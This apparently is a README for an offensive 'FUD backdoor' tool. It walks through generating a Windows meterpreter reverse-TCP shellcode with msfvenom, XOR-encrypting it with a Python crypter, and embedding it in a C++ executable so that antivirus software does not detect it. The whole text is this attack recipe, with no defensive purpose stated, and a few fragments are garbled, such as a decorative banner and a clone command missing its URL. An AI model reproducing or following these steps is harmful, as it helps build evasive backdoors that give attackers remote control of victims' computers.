

█☰ ▚▞ █ ▙▄  🆁 ▞▚ ▙ ▙ █ ▜▛  ▜▛ 🆁 ██ ▟ ▞▚ ▛▟ 

=================
Потрясающую производительность!
Potryasayushchuyu proizvoditel'nost'!
Amazing performance! 

Generate FUD backdoor with a Python Crypter 
Follow the steps bellow to generate a crypted
Shellcode that can be used on a C++ executable.

Clone the repository
sudo git clone
cd fud-backdoor
Generate The ShellCode
msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=(IP) LPORT=(PORT) -f raw -o raw.txt
Encode the ShellCode With the XOR Encryption
python xor_encryptor.py raw.txt > xor_shellcode.txt
Add the crypted shellcode on main.cpp
Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:

char b[] = /*xor_shellcode*/
Compile the main.cpp file
